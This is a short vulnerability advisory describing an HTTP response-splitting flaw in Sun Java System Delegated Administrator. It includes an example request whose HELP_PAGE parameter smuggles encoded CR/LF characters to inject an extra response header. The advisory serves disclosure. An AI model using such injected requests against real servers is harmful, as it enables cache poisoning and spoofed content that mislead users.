Sun Java System Delegated Administrator is prone to an HTTP response-splitting vulnerability because it fails to sufficiently sanitize user-supplied data.

Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into a false sense of trust.

The following example HTTP session is available:

$ openssl s_client -connect <server>:443

GET
/da/DA/Login?Login.HelpHREF=http://www.example.com/&com_sun_web_ui_popup=false&HELP_PAGE=/help/%0AX-Tag:%20Core%20Security%20Technologies%0A%0D&jato.pageSession=
